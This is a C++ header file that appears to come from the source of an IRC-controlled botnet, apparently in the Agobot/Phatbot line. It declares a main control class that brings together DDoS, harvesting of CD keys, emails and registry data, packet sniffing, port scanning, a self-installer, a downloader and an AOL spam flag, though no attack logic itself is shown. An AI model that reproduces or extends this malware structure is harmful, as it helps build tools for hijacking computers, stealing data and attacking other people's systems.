#ifndef __MAINCTRL_H__
#define __MAINCTRL_H__

#include "cmdline.h"
#include "cstring.h"
#include "consdbg.h"
#include "random.h"
#include "cvar.h"
#include "bot.h"
#include "commands.h"
#include "mac.h"
#include "utility.h"
#include "sdcompat.h"
#include "irc.h"
#include "ddos.h"
#include "redirect.h"
#include "harvest_cdkeys.h"
#include "harvest_emails.h"
#include "harvest_registry.h"
#include "logic.h"
#include "psniff.h"
#include "httpd.h"
#include "netstat.h"
#include "portscan.h"
#include "installer.h"
#include "findfile.h"
#include "dcc.h"
//#include "autocmd.h"
#include "advscan/advscan.h"

#ifdef WIN32
	int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hprev, PSTR cmdline, int ishow);
#else Debug-NoSSL
	int main(int argc, char **argv);
#endif

class CMainCtrl
{
public:
	int Main(const char *szCmdLine, const char *szArgv0);
	int MainCtrl();

	void RegisterService();

	CCommands			m_cCommands;
	CCmdLine			m_cCmdLine;
	CConsDbg			m_cConsDbg;
	CBot				m_cBot;
	CMac				m_cMac;
	CCVar				m_cCVar;
	CInstaller			m_cInstaller;
	CDownloader			m_cDownloader;
	CAdvScan			m_cAdvScan;
	CIRC				m_cIRC;
//	CSendFile			m_cSendFile;
	CSendFileFTP		m_cSendFileFTP;
//	CIdentD				m_cIdentD;
	CDDOS				m_cDDOS;
//	CAutoCmd			m_autoCmd;
//	CRedirect			m_cRedirect;
//	CSpeedTest          m_cSpeedTest;
//	CHarvest_CDKeys		m_cHarvest_CDKeys;
	CsdbotCompat		m_SdCompat;
//	CHarvest_EMails		m_cHarvest_EMails;
//	CHarvest_Registry	m_cHarvest_Registry;
	CLogic				m_cLogic;
//	CSnifferPick		m_cPsniff;
//	CSniffer			m_cSSniff;
//	CSnap				m_cSnap;
	CRSLControl			m_cRSLControl;
	CPortCheck			m_cPortCheck;
//	CFindFile			m_cFindFile;
//	CDccCommand			m_cDccCommand;
//	CPortScan			m_cPortScan;
#ifdef WIN32
	CService			m_cService;
#endif // WIN32
	CProcessControl		m_cProcessControl;

	bool				m_bRunning;
	CString				m_sUserName;
	CString				m_sNameVerStr;
	CString				m_sArgv0;
	CString				m_sCmdLine;
	bool				m_bIdentD_Running;
	bool				m_bCanSpamAOL;
//	bool				m_sRunning;
	list<CThread*>		m_lCanJoin;
};

extern CMainCtrl g_cMainCtrl;

#endif // __MAINCTRL_H__
